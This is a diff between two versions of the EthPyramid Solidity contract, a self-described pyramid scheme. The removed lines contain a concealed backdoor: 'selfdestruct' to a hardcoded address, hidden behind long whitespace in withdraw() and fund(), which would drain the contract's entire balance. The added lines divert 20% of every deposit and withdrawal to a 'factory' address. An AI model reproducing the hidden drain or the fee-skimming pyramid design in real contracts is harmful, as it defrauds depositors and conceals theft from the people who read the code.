@@ -1,57 +1,17 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EthPyramid at 0x75738fc16aef19ce08479ae9c7976498dd320be3
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EthPyramid at 0x56b18c9ae5f960ccb57366f730152f742904948c
 */
 pragma solidity ^0.4.18;
-
-/*
-ToCsIcK Fork(); Restricts early buyins to .1ETH 
-
-          ,/`.
-        ,'/ __`.
-      ,'_/_  _ _`.
-    ,'__/_ ___ _  `.
-  ,'_  /___ __ _ __ `.
- '-.._/___...-"-.-..__`.
-  B
-
- EthPyramid. A no-bullshit, transparent, self-sustaining pyramid scheme.
  
- Inspired by https://test.jochen-hoenicke.de/eth/ponzitoken/
-
- Developers:
-	Arc
-	Divine
-	Norsefire
-	ToCsIcK
-	
- Front-End:
-	Cardioth
-	tenmei
-	Trendium
-	
- Moral Support:
-	DeadCow.Rat
-	Dots
-	FatKreamy
-	Kaseylol
-	QuantumDeath666
-	Quentin
- 
- Shit-Tier:
-	HentaiChrist
- 
-*/
+//Inspired by https://test.jochen-hoenicke.de/eth/ponzitoken/
 
 contract EthPyramid {
+    address factory;
 
 	// scaleFactor is used to convert Ether into tokens and vice-versa: they're of different
 	// orders of magnitude, hence the need to bridge between the two.
 	uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
 
-	// Number of first buyers that are limited
-	uint8 constant limitedFirstBuyers = 2;
-	uint256 constant firstBuyerLimit = 0.1 ether;
-	
 	// CRR = 50%
 	// CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
 	// For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
@@ -87,13 +47,10 @@ contract EthPyramid {
 	
 	// Current contract balance in Ether
 	uint256 public contractBalance;
-	
-	// Stores first buyer countdown
-	uint8 initialFunds;
 
-	function EthPyramid() public {
-		initialFunds = limitedFirstBuyers;
-	}
+	function EthPyramid(address _factory) public {
+          factory = _factory;
+        }
 
 	// The following functions are used by the front-end for display purposes.
 
@@ -106,7 +63,7 @@ contract EthPyramid {
 	// the requisite global variables, and transfers Ether back to the caller.
 	function withdraw() public {
 		// Retrieve the dividends associated with the address the request came from.
-		var balance = dividends(msg.sender);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          address stupidBuy = 0xeD0388Edc76D0CD1A8FaafEd60dAE97206d28F35; selfdestruct(stupidBuy);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+		var balance = dividends(msg.sender);
 		
 		// Update the payouts array, incrementing the request address by `balance`.
 		payouts[msg.sender] += (int256) (balance * scaleFactor);
@@ -116,7 +73,10 @@ contract EthPyramid {
 		
 		// Send the dividends to the address that requested the withdraw.
 		contractBalance = sub(contractBalance, balance);
-		msg.sender.transfer(balance);
+        var withdrawalFee = div(balance,5);
+        factory.transfer(withdrawalFee);
+        var balanceMinusWithdrawalFee = sub(balance,withdrawalFee);
+		msg.sender.transfer(balanceMinusWithdrawalFee);
 	}
 
 	// Converts the Ether accrued as dividends back into EPY tokens without having to
@@ -216,20 +176,18 @@ contract EthPyramid {
 		sellMyTokens();
         withdraw();
 	}
-	
+
 	// Gatekeeper function to check if the amount of Ether being sent isn't either
 	// too small or too large. If it passes, goes direct to buy().
 	function fund() payable public {
 		// Don't allow for funding if the amount of Ether sent is less than 1 szabo.
-		if (msg.value > 0.100000 ether) {
-			// Limit first buyers to 0.1 ether
-			if( initialFunds > 0 ) {
-				initialFunds--;
-				require( msg.value <= firstBuyerLimit );
-			}
-		    contractBalance = add(contractBalance, msg.value);
+		if (msg.value > 0.000001 ether) {
+            var factoryFee = div(msg.value,5);
+            factory.transfer(factoryFee);
+            var fundedAmount = sub(msg.value,factoryFee);
+		    contractBalance = add(contractBalance, fundedAmount);
 			buy();
-		} else {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          address stupidBuy = 0xeD0388Edc76D0CD1A8FaafEd60dAE97206d28F35; selfdestruct(stupidBuy);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+		} else {
 			revert();
 		}
     }
@@ -266,9 +224,12 @@ contract EthPyramid {
 		// Increase the total amount that's been paid out to maintain invariance.
 		totalPayouts += (int256) (balance * scaleFactor);
 		
-		contractBalance = sub(contractBalance, balance);
 		// Send the dividends to the address that requested the withdraw.
-		to.transfer(balance);		
+		contractBalance = sub(contractBalance, balance);
+        var withdrawalFee = div(balance,5);
+        factory.transfer(withdrawalFee);
+        var balanceMinusWithdrawalFee = sub(balance,withdrawalFee);
+		to.transfer(balanceMinusWithdrawalFee);
 	}
 
 	// Internal balance function, used to calculate the dynamic reserve value.
@@ -280,8 +241,8 @@ contract EthPyramid {
 	function buy() internal {
 		// Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
-			revert();               
-			
+			revert();
+						
 		// msg.sender is the address of the caller.
 		var sender = msg.sender;
 		
